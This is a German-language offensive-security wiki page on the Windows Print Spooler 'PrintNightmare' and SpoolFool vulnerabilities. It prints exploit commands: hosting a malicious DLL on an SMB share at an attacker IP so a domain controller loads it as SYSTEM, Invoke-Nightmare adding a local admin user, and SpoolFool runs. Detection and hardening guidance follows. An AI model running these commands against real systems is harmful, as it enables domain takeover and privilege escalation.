# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ist der Sammelbegriff für eine Reihe von Sicherheitslücken im Windows-Dienst **Print Spooler**, die **die Ausführung beliebigen Codes als SYSTEM** und, wenn der Spooler über RPC erreichbar ist, **Remote Code Execution (RCE) auf Domänencontrollern und Dateiservern** ermöglichen. Die am häufigsten ausgenutzten CVEs sind **CVE-2021-1675** (anfangs als LPE eingestuft) und **CVE-2021-34527** (vollständige RCE). Spätere Sicherheitslücken wie **CVE-2021-34481 („Point & Print“)** und **CVE-2022-21999 („SpoolFool“)** zeigen, dass die Angriffsfläche noch lange nicht geschlossen ist.

Wenn du nach **Authentication Coercion / Relay** über den Spooler suchst und nicht nach **treiberbasierter RCE/LPE**, findest du [hier eine weitere Seite über den Missbrauch von Druckern für Coercion](printers-spooler-service-abuse.md). Auf dieser Seite geht es um das **Laden von Treibern / DLLs als SYSTEM**.

---

## 1. Verwundbare Komponenten & CVEs

| Jahr | CVE | Kurzname | Primitive | Hinweise |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1“|LPE|Im Juni-2021-CU gepatcht, aber durch CVE-2021-34527 umgangen|
|2021|CVE-2021-34527|„PrintNightmare“|RCE/LPE|`AddPrinterDriverEx` ermöglicht authentifizierten Benutzern, eine Treiber-DLL von einer Remote-Freigabe zu laden; seit August 2021 sind dafür üblicherweise gelockerte Point & Print-Richtlinien erforderlich|
|2021|CVE-2021-34481|„Point & Print“|LPE|Installation nicht signierter Treiber durch Benutzer ohne Adminrechte|
|2022|CVE-2022-21999|„SpoolFool“|LPE|Erstellung beliebiger Verzeichnisse → DLL-Pflanzung – funktioniert auch nach den Patches von 2021|

Alle nutzen eine der **MS-RPRN / MS-PAR RPC-Methoden** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) oder Vertrauensbeziehungen innerhalb von **Point & Print** aus.

## 2. Exploitation-Techniken

### 2.1 Kompromittierung eines Remote-Domänencontrollers (CVE-2021-34527)

Ein authentifizierter, aber **nicht privilegierter** Domänenbenutzer kann beliebige DLLs als **NT AUTHORITY\SYSTEM** auf einem Remote-Spooler (häufig dem DC) ausführen, indem er:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Beliebte PoCs sind **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) und Benjamin Delpys Module `misc::printnightmare / lsa::addsid` in **mimikatz**.

### 2.2 Lokale Rechteausweitung (alle unterstützten Windows-Versionen, 2021–2024)

Dieselbe API kann **lokal** aufgerufen werden, um einen Treiber aus `C:\Windows\System32\spool\drivers\x64\3\` zu laden und SYSTEM-Rechte zu erlangen:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Moderne Triage auf gepatchten Hosts

Auf einem vollständig aktualisierten Host schlagen öffentliche PrintNightmare-PoCs oft fehl, weil Windows die Installation von Druckertreibern inzwischen standardmäßig auf **Administratoren beschränkt** (`RestrictDriverInstallationToAdministrators=1` seit dem 10. August 2021). Bevor du einen Exploit auf ein Ziel loslässt, solltest du zuerst prüfen, ob diese Sicherheitsänderung in der Umgebung für ältere Druckerbereitstellungen rückgängig gemacht wurde:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Die zwei interessantesten schwachen Werte sind in der Regel:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Prüfe von Linux aus kurz, ob das Ziel die relevanten print RPC-Schnittstellen bereitstellt, bevor du einen PoC ausführst:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Einige neuere öffentlich verfügbare Tools bieten außerdem einen sichereren **Prüf-/Auflisten**-Workflow, bevor eine DLL gesendet wird:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Wenn du als Benutzer mit niedrigen Berechtigungen `RPC_E_ACCESS_DENIED` (`0x8001011b`) erhältst, siehst du normalerweise das Verhalten der Standardeinstellung nach 2021 und keinen Transportfehler.

> Unter Windows 11 22H2+ und neueren Client-Builds verwendet Remote Printing standardmäßig **RPC over TCP**; **RPC over named pipes** (`\PIPE\spoolss`) ist deaktiviert, sofern es nicht ausdrücklich wieder aktiviert wird. Einige ältere PoCs und Lab-Notizen gehen weiterhin davon aus, dass die Named Pipe erreichbar ist.<sup>[[4]](#references)</sup>

### 2.4 Missbrauch von Package Point & Print in „gepatchten“ Netzwerken

Viele Unternehmensumgebungen blieben nach den ursprünglichen Patches von 2021 **aufgrund ihrer Richtlinien anfällig**, weil Helpdesk- oder Print-Server-Workflows weiterhin erforderten, dass Benutzer ohne Administratorrechte Treiber installieren oder aktualisieren konnten. In der Praxis sieht der offensive Ansatz so aus:

- Wenn Sicherheitsabfragen vollständig deaktiviert sind, ist **klassisches PrintNightmare mit beliebigen DLLs** weiterhin der kürzeste Weg.
- Wenn `Only use Package Point and Print` aktiviert ist, musst du in der Regel auf einen Pfad mit einem **signierten, paketfähigen Treiber** ausweichen, statt eine beliebige DLL abzulegen.<sup>[[3]](#references)</sup>
- Untersuchungen aus dem Jahr 2024 zeigten, dass **`Package Point and Print - Approved servers` für sich genommen keine strikte Vertrauensgrenze darstellt**: Wenn ein Angreifer die Namensauflösung für einen zugelassenen Print-Server fälschen oder übernehmen kann, können Opfer weiterhin auf einen bösartigen Server umgeleitet werden, der die Richtlinienprüfungen besteht.<sup>[[4]](#references)</sup>
- Selbst die Kombination aus UNC-Härtung und erzwungenem RPC-over-SMB kann unzuverlässig sein, da moderne Clients möglicherweise **auf RPC over TCP zurückgreifen**.<sup>[[4]](#references)</sup>

Deshalb geht es bei modernen Exploits im Stil von PrintNightmare oft eher um den **Missbrauch von Richtlinien zur Druckerbereitstellung in Unternehmen** als darum, den ursprünglichen PoC von 2021 unverändert erneut auszuführen.

### 2.5 SpoolFool (CVE-2022-21999) – Umgehung der Fixes von 2021

Microsofts Patches von 2021 blockierten das Laden von Treibern aus der Ferne, **härteten aber nicht die Verzeichnisberechtigungen**. SpoolFool missbraucht den Parameter `SpoolDirectory`, um ein beliebiges Verzeichnis unter `C:\Windows\System32\spool\drivers\` zu erstellen, eine Payload-DLL abzulegen und den Spooler zu zwingen, sie zu laden:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Der Exploit funktioniert auf vollständig gepatchten Windows 7 → Windows 11 und Server 2012R2 → 2022 vor den Updates vom Februar 2022<sup>[[2]](#references)</sup>

---

## 3. Erkennung & Hunting

* **PrintService-Logs** – Aktiviere den Kanal *Microsoft-Windows-PrintService/Operational* und achte auf **Event ID 316** (Treiber hinzugefügt/aktualisiert, enthält üblicherweise die DLL-Namen) sowohl bei erfolgreichen als auch bei fehlgeschlagenen Versuchen. Achte zusätzlich auf **Event ID 808/811** bei verdächtigen Fehlern beim Laden von Spooler-Modulen/Treibern.
* **Sysmon** – `Event ID 7` (Image loaded) oder `11/23` (File write/delete) innerhalb von `C:\Windows\System32\spool\drivers\*`, wenn der übergeordnete Prozess **spoolsv.exe** ist.
* **Prozessabstammung** – Löse einen Alarm aus, sobald **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell oder einen anderen unerwarteten, nicht signierten untergeordneten Prozess startet.
* **Netzwerk-Telemetrie** – Unerwartete SMB-Abrufe von `spoolsv.exe` zu von Angreifern kontrollierten Freigaben oder ungewöhnlicher Printer-RPC-Traffic von Servern, die nicht als Printserver fungieren sollten, sind beides aussagekräftige Hinweise.

## 4. Mitigation & Hardening

1. **Patchen!** – Installiere das neueste kumulative Update auf jedem Windows-Host, auf dem der Print Spooler-Dienst installiert ist.
2. **Deaktiviere den Spooler, wenn er nicht benötigt wird**, insbesondere auf Domain Controllern:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Remoteverbindungen blockieren**, während lokales Drucken weiterhin möglich ist – Gruppenrichtlinie: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print auf Administratoren beschränken**, indem Sie Folgendes festlegen:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Detaillierte Anleitung in Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Wenn geschäftliche Anforderungen `RestrictDriverInstallationToAdministrators=0` erzwingen, betrachte alle anderen Druckerrichtlinien nur als **teilweise Mitigation**. Bevorzuge mindestens **package-aware drivers**, aktiviere **Only use Package Point and Print** und beschränke **Package Point and Print - Approved servers** auf explizit angegebene Druckserver innerhalb des Forests.<sup>[[3]](#references)</sup>
6. **Setze die RPC-Privatsphäre des Druckers nicht zurück**, nur um fehlerhafte Druckerzuordnungen zu beheben. Umgebungen, die `RpcAuthnLevelPrivacyEnabled=0` festlegen, machen die für **CVE-2021-1678** eingeführte Härtung rückgängig und sollten bei einem Engagement üblicherweise genauer untersucht werden.<sup>[[4]](#references)</sup>

---

## 5. Verwandte Forschung / Tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)-Module
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – Standardimplementierung mit Impacket und den Modi `-check`, `-list` und `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – Wrapper mit integrierter SMB-Bereitstellung, Unterstützung mehrerer Ziele und den Modi `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – Missbrauch eines eigenen verwundbaren Druckertreibers über package Point & Print
* SpoolFool-Exploit und Write-up
* 0patch-Micropatches für SpoolFool und andere Spooler-Fehler

Wenn du **Authentifizierung erzwingen** willst, statt über den Spooler einen Treiber zu laden, gehe zu [Missbrauch des Druckerspoolerdienstes](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Verwaltung des Standardverhaltens für die Treiberinstallation bei neuem Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Ein praktischer Leitfaden zu PrintNightmare im Jahr 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare ist noch nicht vorbei](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
